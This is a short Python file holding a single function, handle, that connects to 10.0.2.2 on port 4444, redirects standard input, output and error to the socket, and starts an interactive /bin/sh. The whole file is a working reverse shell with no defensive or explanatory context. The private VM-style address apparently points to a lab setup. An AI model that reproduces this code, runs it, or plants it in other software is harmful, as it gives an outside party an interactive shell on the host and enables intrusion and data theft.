import socket
import subprocess
import os


def handle(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.2.2", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
